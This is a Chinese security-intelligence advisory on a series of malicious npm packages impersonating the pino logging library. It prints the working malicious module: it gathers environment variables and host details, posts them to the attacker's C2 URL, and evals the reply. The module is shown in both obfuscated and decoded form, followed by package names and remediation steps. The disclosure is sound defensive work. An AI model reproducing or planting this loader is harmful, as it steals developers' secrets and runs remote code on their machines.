#  SBOM风险预警 | pino系列投毒包开展敏感数据窃取及远程代码执行攻击   
原创 悬镜安全情报中心  悬镜安全   2025-06-06 08:02  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/KOWJ2ib68IGj56PMu0icIF7jYduLbYTpshJC1x89TawLCeibYDfBNPKicmHF2ibBc98oiaKiax0bTs9Vk5mQT9wYuCLhw/640?wx_fmt=gif&from=appmsg "")  
  
**SBOM情报概述**  
  
  
  
Summary  
  
  
近期（2025.04~2025.06），悬镜供应链安全情报中心在NPM官方仓库中连续捕获近40起伪装成高下载量知名日志库pino的包投毒事件，该系列投毒的特点是通过代码克隆pino项目完整源码，并篡改pino模块主入口文件代码加载恶意模块，恶意模块主要功能是收集外传系统敏感信息，以及从攻击者C2服务器拉取并远程执行任意代码。根据NPM官方接口统计，  
近一个月  
该pino  
系列恶意  
包的总下载量接近7000次。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoHKwPLoF5TP2iaAibwoL7iaRXHzun9ibAFY7kIoFqhh2ViaYAnFWJlfg8vBMQ20uWqO8sWCpl3utXM5YsQ/640?wx_fmt=png&from=appmsg "")  
  
pino  
项目主页  
(https://www.npmjs.com/package/pino)  
  
截至目前，pino系列投毒中仍有一部分恶意包正常托管在NPM官方源及国内各大主流镜像源，对NPM开发者来说存在较大安全隐患。最近一次该系列投毒来自攻击者（oleksandrrozgon77@gmail.com）在6月3号投放的router-parse恶意包。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoHKwPLoF5TP2iaAibwoL7iaRXH4usYqxsXhIQcjx1SAvPwfC27GhwVoYFpSX7E8tjI1jTedRgVcZtN9g/640?wx_fmt=png&from=appmsg "")  
  
恶意包  
router-parse  
主页  
  
  
**投毒分析**  
  
  
  
Poisoning Analysis  
  
  
  
1  
  
**代码克隆篡改**  
  
  
  
以router-parse 恶意包为例，投毒者通过对日志库pino进行完整项目代码克隆，组件包主模块入口为pino.js代码文件。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoHKwPLoF5TP2iaAibwoL7iaRXHpzHE24sr5VstREYku4DeyiaXp3ln8xOibXctJzNL2n7XQZaycXgCdbZQ/640?wx_fmt=png&from=appmsg "")  
  
恶意包   
router-parse   
代码结构  
  
  
如下图所示，投毒者通过篡改包模块入口文件pino.js，利用require引入恶意模块'./lib/write'，对应恶意代码文件'./lib/write.js'，并且在对pino()函数进行劫持，在函数入口处优先调用恶意模块./lib/write.js中的writer()函数。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoHKwPLoF5TP2iaAibwoL7iaRXHUQ8dKqvC6L7Jok3RzrrLTlUiaEy14TB92icOKPF1nQVj1d7WMlGzqa2w/640?wx_fmt=png&from=appmsg "")  
  
pino.js  
加载恶意模块  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoHKwPLoF5TP2iaAibwoL7iaRXHWFm5kYNAL80pm2LqDPyGFt8ibYIdKZia1usqBPQPaQUFsLydtMIensJQ/640?wx_fmt=png&from=appmsg "")  
  
pino()  
函数入口劫持  
  
  
2  
  
**敏感信息窃取及远程代码执行**  
  
  
恶意模块./lib/write.js文件代码如下所示，主要功能是收集目标系统的环境变量数据及系统平台信息（包括主机名、⽤户名、⽹卡MAC等）通过HTTP POST请求发送到投毒者C2服务器（  
https://ip-check-api.vercel.app/api/ipcheck/703  
）  
，并会从投毒者服务器响应数据中提取下⼀阶段代码后调用eval函数实现远程代码执行功能。  
```
'use strict'
const os = require('os')
 
function getMacAddress () {
 const interfaces =
os.networkInterfaces()
 const macAddresses
= []
 
 for (const interfaceName in interfaces) {
  const
networkInterface = interfaces[interfaceName]
 
  networkInterface.forEach((details) => {
   // Check for
IPv4 and that the address is not internal (i.e., not 127.0.0.1)
   if (details.family === 'IPv4' && !details.internal) {
    macAddresses.push(details.mac)
   }
  })
 }
 return macAddresses
}
const data = {
 ...process.env,
 platform: os.platform(),
 hostname: os.hostname(),
 username: os.userInfo().username,
 macAddresses: getMacAddress()
}
 
function g (h) { return h.replace(/../g, match => String.fromCharCode(parseInt(match, 16))) }
 
const hl = [
 g('72657175697265'),
 g('6178696f73'),
 g('706f7374'),
 g('68747470733a2f2f69702d636865636b2d6170692e76657263656c2e6170702f6170692f6970636865636b2f373033'),
 g('68656164657273'),
 g('782d7365637265742d686561646572'),
 g('736563726574'),
 g('7468656e')
]
 
//
eslint-disable-next-line no-eval
module.exports = () => require(hl[1])[[hl[2]]](hl[3], data, { [hl[4]]: { [hl[5]]: hl[6] } })[[hl[7]]](r => eval(r.data)).catch(() => {})
```  
  
投毒者使用的C2服务器地址被编码嵌入到hl数组中，通过字符解码后，还原出hl中隐藏的真实数据如下所示：  
```
[
 'require',
 'axios',
 'post',
 'https://ip-check-api.vercel.app/api/ipcheck/703',
 'headers',
 'x-secret-header',
 'secret',
 'then'
]
```  
  
最终  
该恶意模块导出函数的真实代码  
还原为  
如下所示：  
```
module.exports = () => require('axios')['post']('https://ip-check-api.vercel.app/api/ipcheck/703', data, {'headers':{'x-secret-header':'secret'}})['then'](r => eval(r.data)).catch(() => {})
```  
  
  
3  
  
**恶意包信息**  
  
  
  
  
该pino系列投毒所涉及的恶意NPM包信息（purl格式）汇总如下：  
```
pkg:npm/router-parse@1.0.1
pkg:npm/vite-plugin-purify@2.3.4
pkg:npm/nextjs-insight@1.1.0
pkg:npm/https-parse@2.0.1
pkg:npm/vite-plugin-svgn@1.6.8
pkg:npm/jsons-pack@7.9.4
pkg:npm/vite-plugin-style-svg@2.3.4
pkg:npm/motion-exts@1.0.1
pkg:npm/react-logs@6.1.2
pkg:npm/node-loggers@0.0.2
pkg:npm/node-loggers@3.3.1
pkg:npm/style-beautify-plugins@4.0.0
pkg:npm/resize-plugins@1.7.2
pkg:npm/vite-config-pretty-js@2.14.8
pkg:npm/vite-tsconfig-pretty@2.6.7
pkg:npm/recover-plugins@1.0.0
pkg:npm/wise-plugins@2.2.9
pkg:npm/trip-plugins@1.7.5
pkg:npm/zeal-plugins@1.0.0
pkg:npm/stylelist-plugins@1.5.2
pkg:npm/wrap-plugins@1.0.4
pkg:npm/yellow-plugins@2.5.7
pkg:npm/setting-plugins@3.0.5
pkg:npm/support-plugins@1.1.4
pkg:npm/react-loggers@6.9.1
pkg:npm/logs-buffer@6.14.8
pkg:npm/react-youtube-dom@10.14.0
pkg:npm/react-youtube-dom@10.15.0
pkg:npm/react-youtube-dom@10.15.1
pkg:npm/flow-plugins@1.1.7
pkg:npm/date-min@1.4.8
pkg:npm/flexible-loggers@0.1.1
pkg:npm/beautiful-plugins@2.1.4
pkg:npm/util-buffers@6.14.8
pkg:npm/use-videos@1.0.0
pkg:npm/lucide-node@1.0.0
pkg:npm/jsonspecific@3.14.7
pkg:npm/flush-plugins@4.0.0
pkg:npm/blur-plugins@1.2.1
pkg:npm/chalk-config@1.0.4
pkg:npm/chalk-config@2.14.7
pkg:npm/core-pino@9.6.0
pkg:npm/core-pino@10.6.0
pkg:npm/core-pino@10.6.0
pkg:npm/core-pino@10.7.1
```  
  
4  
  
**IoC 数据**  
  
  
  
本文分析所涉及的恶意IoC数据如下表所示：  
  
![](https://mmecoa.qpic.cn/mmecoa_png/KOWJ2ib68IGjEmLZG1bwlfgCGGIUhtBWFMs3w9GRhrT1btz8RXiaB5srhbFicnS6vdTlKTkTRhWOiaCa4zgibS4iaRNg/640?wx_fmt=png&from=appmsg "")  
  
**排查方式**  
  
  
  
Investigation Method  
  
  
以   
router-parse  
 恶意组件为例，开发者可通过命令   
npm list   
router-parse  
  
在项目目录下使用查询是否已安装存在恶意投毒的组件  
版本  
，如果已安装请立即使用   
npm uninstall   
router-parse   
进行卸载。同时还需关闭系统网络并排查系统是否存在异常进程。  
  
此外，也可使用   
OpenSCA-cli   
工具将受影响的组件包按如下示例保存为db.json文件，直接执行扫描命令（opensca-cli -db db.json -path ${project_path}），即可快速获知您的项目是否受到投毒包影响。  
```
[   
  {     
    "product":
"router-parse",     
    "version":
"[1.0.1]",     
    "language":
"javascript",     
    "id":
"XMIRROR-MAL45-F7D53421",     
    "description":
"恶意NPM组件伪装知名日志库pino开展系统敏感信息窃取及远程代码执行攻击",     
    "release_date":
"2025-06-03"   
  }
]
```  
  
悬镜供应链安全情报中心是国内首个数字供应链安全情报研究中心。依托悬镜安全团队强大的供应链SBOM管理与监测能力和AI安全大数据云端分析能力，悬镜云脉XSBOM数字供应链安全情报预警服务通过对全球数字供应链投毒情报、漏洞情报、停服断供情报等进行实时动态监测与溯源分析，可为用户智能精准预警“与我有关”的数字供应链安全情报，提供情报查询、情报订阅、可视化关联分析等企业级服务。  
  
＋  
  
**推荐阅读**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/KOWJ2ib68IGhAZG4ianfypCzgVMlEfTLJaiaY2WibzpCLqn4ibibAxZOeD9tOg9HZV2BibjibyVGGVOXib0FLWXPLubELdg/640?wx_fmt=gif&from=appmsg "")  
  
  
[](https://mp.weixin.qq.com/s?__biz=MzA3NzE2ODk1Mg==&mid=2647790604&idx=1&sn=99d6b75e6bd62f4e5e32cacb75856b9f&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=MzA3NzE2ODk1Mg==&mid=2647795500&idx=1&sn=e6e5192fdb5c78c9cf37812a319c9f88&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=MzA3NzE2ODk1Mg==&mid=2647795690&idx=1&sn=5f9b9f7cc3300dffbb34b4c150049e12&scene=21#wechat_redirect)  
  
[]()  
  
**关于“悬镜安全”**  
  
****  
  
悬镜安全，起源于子芽创立的北京大学网络安全技术研究团队“XMIRROR”，作为数字供应链安全和DevSecOps敏捷安全开拓者，始终专注于以“AI智能代码疫苗”技术为内核，凭借原创专利级“多模态SCA+DevSecOps+SBOM风险情报预警”的第四代DevSecOps数字供应链安全管理体系，创新赋能金融、车联网、通信、能源、政企、智能制造和泛互联网等行业用户，构筑起适应自身业务弹性发展、面向敏捷业务交付并引领未来架构演进的共生积极防御体系，持续守护中国数字供应链安全。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KOWJ2ib68IGgbc11SUokwoUiacpXOWwicJCC2iaPL17Bia4raDLC9kyMgGPBcaicxnw4QbhZ8nyrstrsIbPTicmo0BRwQ/640?wx_fmt=png&from=appmsg "")  
  
  
